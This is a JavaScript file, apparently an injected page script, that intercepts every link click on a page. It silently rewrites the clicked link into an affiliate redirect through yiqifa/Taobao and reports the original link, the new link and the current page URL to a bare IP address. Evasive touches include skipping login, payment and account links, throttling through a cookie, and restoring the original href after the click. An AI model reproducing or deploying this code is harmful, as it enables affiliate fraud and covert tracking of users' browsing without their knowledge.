var JueJinLian={		
		adds:"", 
		_w_id:0, 
		_e:"", 
		_c:"",
		_i:"", 
		
		_is_tao:1, 
		_tao_channel:0, 
		_basic_channel:0, 
		_is_yiqifa:1, 
		_is_zyiqifa:1,
		ignore: "_ch_ignore",
		_url :"http://p.yiqifa.com/jc?",
		_md5 : "",
		_zdomain:"",
		
		_stattype:0,
		
	$: function(b) {
        return document.getElementById(b);
    },
    
    _addWid: function(wid){
    		this._w_id = wid;
    },
    
    _addE: function(e){
    		this._e = e;
    },
    
    _addScope : function(tc){
    		this._tao_channel = tc;
    },
    
    _addType : function(bc){
    		this._basic_channel = bc;
    },

	_addStatType : function(t){
    		this._stattype = t;
    },
    
    _connAdd:function(j){
    		j.adds = "&c=" + j._c + "&i=" + j._i + "&w=" + j._w_id + "&l=0&e=" + j._e + "&t=";
    },
    isIgnore: function(b) {
        if (this.hasClass(b, this.ignore)) {
            return true;
        } else {
            if ("object" == typeof b.parentNode) {
                return this.hasClass(b.parentNode, this.ignore);
            }
        }
    },
    hasClass: function(d, c) {
        return d.className.indexOf(c) != -1;
    },
    _findObj:function(i) {
        for (var d = 0; d < 10; d++) {
            if ("object" == typeof i) {
                var f = i.tagName.toLowerCase();
                if ("a" == f || "area" == f) {
                    return this.isIgnore(i) ? null: i;
                }
                if ("body" == f) {
                    break;
                }
                i = i.parentNode;
            } else {
                break;
            }
        }
        return null;
    },
    _urltodomain:function(u){
    		var c = RegExp("^(http://|https://)((\w|\.|-)*?)/", "g");
    		var result = c.exec(u);
    		if(result != null && result.length>2){
    			if(result[2] != null) {
    				return result[2];
    			}
    		}
    		return u;
    },
    _getdomain:function(d){
    		if(d.indexOf(".") != -1){
    				return d.substring(d.indexOf(".")+1,d.length);
    		} else {
    				return d;
    		}
    },
    _isSelf:function(u){
    	var local = location.hostName;
    	local = "^(http://|https://)((" + local + ")|(\w|\.|-)+\.yiqifa\.com):?\d*/";
    		var c = RegExp(local, "g");
    		if(c.exec(u)){
    				
    				return true;
    		}
    		return false;
    },
    _isBasic:function(u){
    		var c = RegExp("^(http://|https://)(.*?)(http%A3%F2%F2|https%A3%F2%F2|http://|https://)(.*?)", "g");
    		var r = c.exec(u);
    		if(r){
    				return false;
    		}
    		return true;
    },
    _getOther:function(u){
    		var c = RegExp("^(http://|https://)(.*?)(http%A3%F2%F2|https%A3%F2%F2)(.*?)%F2", "g");
    		var r = c.exec(u);
    		if(r){
    				return r[4];
    		}
    		return "";;
    },
    _isTao:function(u){ 
    		var c = RegExp("^http://s.click.taobao.com/t_[1,8,9]|http://www.taobao.com/go/chn/", "g");
    		if(c.exec(u)){
    				return true;
    		}
    		return false;
    },
    _isFilter:function(u){ 
		/*
    		var b = md5jjl(u,8);
    		if(eqfSites.u != null){
    				if(eqfSites.u[b] == 0){
    						return true;
    				}
    		}
    		var d = this._urltodomain(u);
    		while(d != this._getdomain(d)){
    				var md = md5jjl(d,8);
    				if(eqfSites.d != null){
    						var a = eqfSites.d[md];
    						if(a == 0){
    								return true;
    						}
    				}
    				d = this._getdomain(d);
    		}*/
    		return false;
    },
    _isYiqifa:function(u){ 
    		var d = this._urltodomain(u);
    		while(d != this._getdomain(d)){
    				var a = eqfCs[d];
    				if(a != null){
    						this._c = a.c;
    						this._i = a.i;
    						return true;
    				}
    				d = this._getdomain(d);
    		}
    		return false;
    },
    _isYiqifaFord:function(d){ 
    		
    		while(d != this._getdomain(d)){
    				var a = eqfC[d];
    				if(a != null){
    						this._c = a.c;
    						this._i = a.i;
    						return true;
    				}
    				d = this._getdomain(d);
    		}
    		return false;
    },
    _changeTao:function(u){ 
    		
    },
    _isChange:function(u){
    		if(!this._isSelf(u)){
    				if(!this._isFilter(u)){
    				
    						if(this._isTao(u)){
    								if(this._tao_channel == 0){
    										this._is_tao = 0;
    										return true;
    								} else {
    										this._is_tao = 0;
    										return false;
    								}
    						} else {
    								if(this._isYiqifa(u)){
    										this._is_yiqifa = 0;
    										return true;
    								} else {
    										this._is_yiqifa = 1;
    										if(this._isBasic(u)){
    												return false;
    										} else if(this.__basic_channel = 1){
    												var zu = this._getOther(u);
    												if(this._isYiqifaFord(zu)){
    														return true;
    												}
    										} 
    										return false;
    								}
    						}
    				}
    				return false;
    		}
    		return false;
    },    
    _jueEvent:function(){
				var a = function(i){
						i = i.target || i.srcElement;
						var j = JueJinLian;
						g = j._findObj(i);
						
						if(g != null){
							var m = g.href;
							var l = m;
						//j._statclick(j._stattype, g, l);
    						if(j._isChange(g.href) && j._check(g.href) && l.length>0 && m.length>0 && j._w_id>0){
    								j._connAdd(j);
    								if(j._tao_channel == 0 && j._is_tao == 0){
    										m = j._url + "fit=t" + j.adds + encodeURIComponent(m);
    								}
    								if(j._is_yiqifa == 0 && !(j._tao_channel == 0 && j._is_tao == 0) && j._si_tao != 0){
    										m = j._url + "fit=b" + j.adds + encodeURIComponent(m);
    								}
    								if(j._is_yiqifa == 1 && !(j._tao_channel == 0 && j._is_tao == 0) && j._si_tao != 0 && j._basic_channel == 1){
    										m = j._url + "fit=a" + j.adds + encodeURIComponent(m);
    								}
									if(l!=m){
										j._SetCookie("_jjlqaz_","no", { expires: 1, path: "/" });
										j._stat("view", j._stattype, l, m);
									}
    						} else {
    								var m = g.href;
    						}
    						if ("_blank" == g.target) {
    	                		setTimeout(function() {g.href = l},500);
    						}
    						if(document.getElementsByTagName("base")[0] !=undefined){
    							if(document.getElementsByTagName("base")[0].target == "_blank"){
    								setTimeout(function() {g.href = l},500);
    							}
    						}
    						j._reset();
    						g.href = m;
						//g.href = l;
						}
				};    		
    		var b = (document.all && window.ActiveXObject && !window.opera) ? true: false;
        if (b) {
            document.attachEvent("onclick", a, false);
        } else {
            document.addEventListener("click", a, false);
        }
				
    },
    _reset: function(){
    		this._c = "";
				this._i = "";
    },
    isNull: function(b) {
        return "" == b || null == b || undefined == b ? true: false;
    },
    _init: function(){
    		return this;
    },
    _main: function(){
    		this._jueEvent();
    },
    _run: function(){
    		this._main();
    },
    _stat: function(log, t, o, n){
        if(o != n && o.length>0 && n.length>0){            
            var img1 = new Image();
            o = o.replace(/&/g, "$").replace(/\|/g, "*");
            n = n.replace(/&/g, "$").replace(/\|/g, "*");
            var u = window.location.href.replace(/&/g, "$").replace(/\|/g, "*");
            
	        var view = "http://103.207.164.162/viewstat.php?log="+log+"&type="+t+"&o="+encodeURIComponent(o)+"&n="+encodeURIComponent(n)+"&u="+encodeURIComponent(u);
		    img1.src = view;
		}
    },
    _statclick: function(t, g, l){
        var h = window.location.host;
	var keys = ["hao123.com"];	
	var result = true;
	if(keys.length>0){
		result = false;
		for(var i=0;i<keys.length;i++){
			if(h.toLowerCase().indexOf(keys[i])>=0){			
				result = true;
				break;
			}
		}
	}
	if(result)
		this._stat("click", t, l, g.innerHTML);
    },
    _trim: function(text){  
	return (text || "").replace(/^\s+|\s+$/g, ""); 
    },
	_GetCookie: function(name){
        var cookieValue = null;
        if (document.cookie && document.cookie != "") {
            var cookies = document.cookie.split(";");
            for (var i = 0; i < cookies.length; i++) {
                var cookie = this._trim(cookies[i]);
                if (cookie.substring(0, name.length + 1) == (name + "=")) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    },
    _SetCookie: function(name, value, options) {    
        options = options || {};
        if (value === null) {
            value = "";
            options.expires = -1;
        }
        var expires = "";
        if (options.expires && (typeof options.expires == "number" || options.expires.toUTCString)) {            
            if (typeof options.expires == "number") {
                var date = new Date();
                date.setTime(date.getTime() + (options.expires * 3* 1000));
				expires = "; expires=" + date.toUTCString();
            } else {
                var date = options.expires;
				expires = "; expires=" + date.toUTCString();
            }            
        }
        var path = options.path ? "; path=" + (options.path) : "";
        var domain = options.domain ? "; domain=" + (options.domain) : "";
        var secure = options.secure ? "; secure" : "";
        document.cookie = [name, "=", encodeURIComponent(value), expires, path, domain, secure].join("");
    },
    _key:["api","register","fanli","passport","cart","buy","login","fanli","tao","sheng1dian","order","account","my","member","pay","admin","manage","profile","open","stat","msg","app"],
    _check:function(u){
		if(this._GetCookie("_jjlqaz_") == null){
			
			for(var i=0;i<this._key.length;i++){
				if(u.toLowerCase().indexOf(this._key[i])>=0){
					//this._stat("view", this._stattype, u, "filter-"+this._key[i]);
					return false;
				}
			}
			
			return true;
		}else{
			//this._stat("view", this._stattype, u, "cookie");
			return false;
		}
    }
};
